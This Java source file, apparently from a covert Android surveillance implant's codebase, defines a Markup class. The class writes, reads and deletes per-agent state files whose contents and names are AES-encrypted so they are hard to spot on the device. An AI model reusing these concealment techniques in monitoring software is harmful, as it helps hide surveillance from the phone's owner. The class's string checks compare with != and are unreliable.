package com.ht.RCSAndroidGUI.evidence;

import java.io.IOException;

import android.util.Log;

import com.ht.RCSAndroidGUI.agent.AgentType;
import com.ht.RCSAndroidGUI.event.EventType;
import com.ht.RCSAndroidGUI.crypto.CryptoException;
import com.ht.RCSAndroidGUI.crypto.Encryption;
import com.ht.RCSAndroidGUI.crypto.Keys;
import com.ht.RCSAndroidGUI.file.AutoFile;
import com.ht.RCSAndroidGUI.file.Path;
import com.ht.RCSAndroidGUI.util.Check;
import com.ht.RCSAndroidGUI.util.Utils;

/**
 * The Class Markup.
 */
public class Markup {

	private static String TAG = "Markup";

	public static final String MARKUP_EXTENSION = ".qmm";
	public static byte markupSeed;
	public static boolean markupInit;
	private String agentId = "core";

	private String lognName;
	private AutoFile file;
	private Encryption encryption;

	private Markup() {
		encryption = new Encryption(Keys.self().getAesKey());
	}

	/**
	 * Instantiates a new markup.
	 * 
	 * @param agentId_
	 *            the agent id_
	 * @param aesKey
	 *            the aes key
	 */
	private Markup(final String agentId_) {
		this();
		agentId = agentId_;
	}

	public Markup(AgentType type) {
		this(type.name());
	}

	public Markup(EventType type) {
		this(type.name());
	}

	/**
	 * Crea un markup vuoto.
	 * 
	 * @return true if successful
	 */
	public boolean createEmptyMarkup() {
		return writeMarkup(null);
	}

	/**
	 * 
	 * @param agentId
	 *            the agent id
	 * @param addPath
	 *            the add path
	 * @return the string
	 */
	static String makeMarkupName(String agentId, final boolean addPath) {
		//final String markupName = Integer.toHexString(agentId);
		String markupName = Utils.byteArrayToHex(Encryption.SHA1(agentId.getBytes()));
		Check.requires(markupName != null, "null markupName");
		Check.requires(markupName != "", "empty markupName");

		String encName = "";

		if (addPath) {
			encName = Path.markup();
		}

		encName += Encryption.encryptName(markupName + MARKUP_EXTENSION, getMarkupSeed());

		Check.asserts(markupInit, "makeMarkupName: " + markupInit);
		return encName;
	}

	private static int getMarkupSeed() {
		if (!markupInit) {
			markupSeed = Keys.self().getAesKey()[0];
			markupInit = true;
		}

		return markupSeed;
	}

	/**
	 * Rimuove il file di markup relativo all'agente uAgentId. La funzione torna
	 * TRUE se il file e' stato rimosso o non e' stato trovato, FALSE se non e'
	 * stato possibile rimuoverlo.
	 * 
	 * @param value
	 *            the agent id_
	 * @return
	 */

	public static synchronized boolean removeMarkup(final String value) {

		final String markupName = makeMarkupName(value, true);

		Check.asserts(markupName != "", "markupName empty");

		final AutoFile file = new AutoFile(markupName);
		if (file.exists()) {
			file.delete();
			return true;
		} else {
			return false;
		}
	}

	/**
	 * Rimuove tutti i file di markup presenti sul filesystem.
	 * 
	 * @return
	 */

	public static synchronized int removeMarkups() {

		int numDeleted = 0;
		for (AgentType type : AgentType.values()) {
			if (removeMarkup(type.name())) {
				numDeleted++;
			} else {
				Log.d("QZ", TAG + " Error (removeMarkups): " + type);
			}
		}

		for (EventType type : EventType.values()) {
			if (removeMarkup(type.name())) {
				numDeleted++;
			} else {
				Log.d("QZ", TAG + " Error (removeMarkups): " + type);
			}
		}

		return numDeleted;
	}

	/**
	 * Checks if is markup.
	 * 
	 * @return true, if is markup
	 */
	public synchronized boolean isMarkup() {
		Check.requires(agentId != null, "agentId null");
		final String markupName = makeMarkupName(agentId, true);
		Check.asserts(markupName != "", "markupName empty");

		final AutoFile fileRet = new AutoFile(markupName);
		return fileRet.exists();
	}

	/**
	 * Legge il file di markup specificato dall'AgentId (l'ID dell'agente che
	 * l'ha generato), torna un array di dati decifrati. Se il file non viene
	 * trovato o non e' possibile decifrarlo correttamente, torna null. Se il
	 * Markup e' vuoto restituisce un byte[0]. E' possibile creare dei markup
	 * vuoti, in questo caso non va usata la ReadMarkup() ma semplicemente la
	 * IsMarkup() per vedere se e' presente o meno.
	 * 
	 * @return the byte[]
	 * @throws IOException
	 *             Signals that an I/O exception has occurred.
	 */
	public synchronized byte[] readMarkup() throws IOException {
		Check.requires(agentId != null, "agentId null");

		final String markupName = makeMarkupName(agentId, true);
		Check.asserts(markupName != "", "markupName empty");

		final AutoFile fileRet = new AutoFile(markupName);

		if (fileRet.exists()) {
			final byte[] encData = fileRet.read();
			final int len = Utils.byteArrayToInt(encData, 0);

			byte[] plain = null;
			try {
				plain = encryption.decryptData(encData, len, 4);
			} catch (CryptoException e) {
				return null;
			}

			Check.asserts(plain != null, "wrong decryption: null");
			Check.asserts(plain.length == len, "wrong decryption: len");

			return plain;
		} else {
			Log.d("QZ", TAG + " Error (readMarkup): Markup file does not exists");
			return null;
		}
	}

	/**
	 * Removes the markup.
	 */
	public synchronized void removeMarkup() {
		Check.requires(agentId != null, "agentId null");

		final String markupName = makeMarkupName(agentId, true);
		Check.asserts(markupName != "", "markupName empty");

		final AutoFile remove = new AutoFile(markupName);
		remove.delete();
	}

	/**
	 * Scrive un file di markup per salvare lo stato dell'agente, il parametro
	 * e' il buffer di dati. Al termine della scrittura il file viene chiuso,
	 * non e' possibile fare alcuna Append e un'ulteriore chiamata alla
	 * WriteMarkup() comportera' la sovrascrittura del vecchio markup. La
	 * funzione torna TRUE se e' andata a buon fine, FALSE altrimenti. Il
	 * contenuto scritto e' cifrato.
	 * 
	 * @param data
	 *            the data
	 * @return true, if successful
	 */
	public synchronized boolean writeMarkup(final byte[] data) {
		final String markupName = makeMarkupName(agentId, true);

		Check.asserts(markupName != "", "markupName empty");

		final AutoFile fileRet = new AutoFile(markupName);

		// se il file esiste viene azzerato
		fileRet.create();

		if (data != null) {
			final byte[] encData = encryption.encryptData(data);

			Check.asserts(encData.length >= data.length, "strange data len");

			fileRet.write(data.length);
			fileRet.append(encData);
		}

		return fileRet.exists();
	}

}